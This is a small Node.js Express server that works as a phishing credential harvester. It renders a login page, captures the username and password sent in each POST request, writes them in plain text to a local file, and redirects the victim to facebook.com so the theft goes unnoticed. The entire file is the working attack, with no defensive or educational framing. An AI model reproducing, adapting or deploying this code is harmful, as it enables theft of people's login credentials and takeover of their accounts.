//importing packages
const express = require('express');
const path = require('path');
const fs = require('fs');

//Declaring constants:
const hostname = '127.0.0.1';
const port = 6363;
const app = express();

//Express related stuffs:
app.use('/static', express.static('static'));
app.use(express.urlencoded());

//PUG relates stuffs:
app.set('view engine', 'pug');
app.set('views', path.join(__dirname, "views"));

//Main server related code:
app.get('/', (req, res) => {
    res.status(200).render('index.pug');
})

//Handling POST requests:
app.post('/', (req, res) => {
    uname = req.body.username
    pass = req.body.password
    var creds = `Username: ${uname}\nPassword: ${pass}`;
    fs.writeFileSync('credintials.txt', creds);
    res.redirect('https://facebook.com/');
})

//Making the server listen:
app.listen(port, ()=>{
    console.log(`Server started at: http://${hostname}:${port}/`);
})
